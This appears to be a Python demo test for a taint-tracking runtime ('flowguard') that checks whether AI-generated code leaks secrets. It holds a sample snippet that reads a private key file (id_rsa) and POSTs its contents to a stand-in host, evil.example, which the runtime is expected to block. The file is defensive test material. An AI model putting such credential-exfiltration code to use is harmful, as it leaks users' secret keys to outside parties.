from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime


BLOCKED_GENERATED_CODE = """
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = secret.replace("PRIVATE", "PUBLIC").lower()
req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST")
urllib.request.urlopen(req)
"""

ALLOWED_GENERATED_CODE = """
import urllib.request

with open(secret_path) as handle:
    _secret = handle.read()

req = urllib.request.Request(url, data=b"ok", method="POST")
urllib.request.urlopen(req)
"""


def main() -> int:
    with tempfile.TemporaryDirectory() as tmpdir:
        secret_path = Path(tmpdir) / "id_rsa"
        secret_path.write_text("PRIVATE KEY", encoding="utf-8")
        runtime = FlowguardRuntime(secret_paths=[secret_path])

        run_blocked_case(runtime, secret_path)
        run_allowed_case(runtime, secret_path)
        write_report(runtime)
        return 0


def run_blocked_case(runtime: FlowguardRuntime, secret_path: Path) -> None:
    try:
        runtime.run_python(
            BLOCKED_GENERATED_CODE,
            inputs={
                "secret_path": str(secret_path),
                "url": "https://evil.example/upload",
            },
        )
    except FlowguardBlocked as err:
        print("Generated-code dynamic taint demo: blocked leak")
        print(f"BLOCKED {err.policy}")
        print(err.explanation)
    else:
        raise AssertionError("expected generated code to be blocked")

    start_event = runtime.emitter.events[0]
    print(f"blocked_code_hash={start_event['details']['code_hash']}")


def run_allowed_case(runtime: FlowguardRuntime, secret_path: Path) -> None:
    calls: list[dict[str, Any]] = []
    original_urlopen = request.urlopen

    def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
        calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
        return b"ok"

    request.urlopen = fake_urlopen
    try:
        try:
            runtime.run_python(
                ALLOWED_GENERATED_CODE,
                inputs={
                    "secret_path": str(secret_path),
                    "url": "https://telemetry.example/event",
                },
            )
        except FlowguardBlocked as err:
            raise AssertionError("expected constant telemetry to be allowed") from err
        else:
            print("Generated-code dynamic taint demo: allowed telemetry")
            print(f"allowed_requests={len(calls)}")

        assert len(calls) == 1
    finally:
        request.urlopen = original_urlopen


def write_report(runtime: FlowguardRuntime) -> None:
    report = runtime.report()
    report_path = Path("logs") / "generated-code-flowguard.report.json"
    events_path = Path("logs") / "generated-code-flowguard.events.jsonl"
    report.write_json(report_path)
    report.write_jsonl(events_path)
    print(f"report_json={report_path}")
    print(f"events_jsonl={events_path}")


if __name__ == "__main__":
    raise SystemExit(main())
